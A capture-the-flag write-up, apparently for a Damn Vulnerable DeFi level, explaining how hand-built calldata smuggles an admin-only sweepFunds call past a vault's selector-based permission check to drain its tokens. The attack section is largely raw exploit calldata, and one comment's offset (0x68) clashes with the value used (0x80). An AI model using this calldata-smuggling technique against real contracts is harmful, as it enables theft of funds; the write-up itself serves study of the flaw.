### Notes on test setup

- 3 accounts: `deployer`, `player`, `recovery`
- **vault**: the `SelfAuthorizedVault` contract is deployed

- Permissions:
    - **player** can call the `withdraw (0xd9caed12)` function on the vault
    - **deployer** can call the `sweepFunds (0x85fb709d)` function on the vault

- **vault** is `initialized`
- **DVT token** are sent to the vault

### Notes on the AuthorizedExecutor::execute function

This method is an `external` `nonReentrant` function. It only allows to execute permissioned actions previously setup via the `setPermissions` method. Hence, I should be able to perform the permissioned actions leveraging this **execute** function.

**Recon**: The `deployer` account can call the `sweepFunc` method.

The execute function signature is as follows:

``` js
function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) 
```

As the deployer, I can use this to call the `sweepFund` in a more "low level way":
- I can wrap the `sweepFunds()` function call into the `actionData` parameter that the `execute` function accepts.

Let's the ABI encode the input parameters that the `sweepFunds` needs:

```js
    const sweepFundsEncodedParams = defaultAbiCoder.encode(
        ["address", "address"], 
        [recovery.address, token.address])
```

This results in having this hex string: `0x0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3`

In front of this we can append the `sweepFunds` function **selector**: `0x85fb709d`.

As a final result this long hex string represent a call to the `sweepFunds` function:
`0x85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3`

So the by calling the execute function with `actionData` set equal to that long hex string, the execute function will call the `sweepFunds` function and send all the funds to a receiver encoded in that long hex string: the `revocery` account.

Hoever, supposing I don't have the `deployer` (admin) permissions, I have to find another way of moving all the funds back to the `recovery` account using my `player` permissions.

### Moving the funds using player permission - the ATTACK

As a player, if I execute the same transaction previously used with the deployer, the contract will revert with `NotAllowed()`. So let's investigate further.

The `execute` function loads the **actionData calladata** as follows:

```js
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
    assembly {
        selector := calldataload(calldataOffset)
    }
```

This means that the function selector is retrieved at **offset 100**. Let's say I'm a `player` and i want to call the `withdraw` function, this is what the ABI of the call would look like:

```
// 4 byte selector for 'execute'
0x1cff79cd
// + 32-byte padded address (1. param of execute)
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
// + 32-byte calldata offset (Everything else is 2. param of execute --> actionData)
0000000000000000000000000000000000000000000000000000000000000040 (0x40 = 64 bytes = 128 hex chars = offset points to 129th char = 65th byte = calldata length)
// + 32-byte calldata length
0000000000000000000000000000000000000000000000000000000000000044
// actual calldata, selector is starting at offset 100 from the start of the calldata
**d9caed12**0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afe...
```

What happens if I manually set the `actionData` offset to "point" to a malicious `calldata` with a different function selector?? This can be done because the selector that the function uses for checking permissions is read always starting at the 100th byte. Let's see how such an attack would look like:

```
// 4 byte selector for 'execute'
0x1cff79cd
// + 32-byte padded address (1. param of execute)
000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
// + 32-byte calldata offset (Everything else is 2. param of execute --> actionData)
// now let's set the exploit offset. I want this to point to the where the attack calldata is: so to the exploit size.
// If we count from the beginning (first 4 byte excluded) the exploit size starts after the 104th byte.
// So the offset must be 104 decimal = 0x68 hex
0000000000000000000000000000000000000000000000000000000000000080 (points to exploit size)
// + 32-byte calldata length --> this can just be 0s (pad)
0000000000000000000000000000000000000000000000000000000000000000
// actual calldata, selector is starting at offset 100 from the start of the calldata
d9caed1200000000000000000000000000000000000000000000000000000000
// the exploit size
0000000000000000000000000000000000000000000000000000000000000044
// the exploit actual calldata: the sweepFunds abi encoded calldata (which is 136 hex chars = 68 bytes = 0x44)
85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3
```

The code gets the selector at the `100th byte` position and checks for msg.sender permissions: 
```js
    uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins = 100
    assembly {
        selector := calldataload(calldataOffset)
    }

    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }
```

With the above abi we are leveraging the permissions of the `d9caed12` selector, then the `sweepFunds` will be actually called.
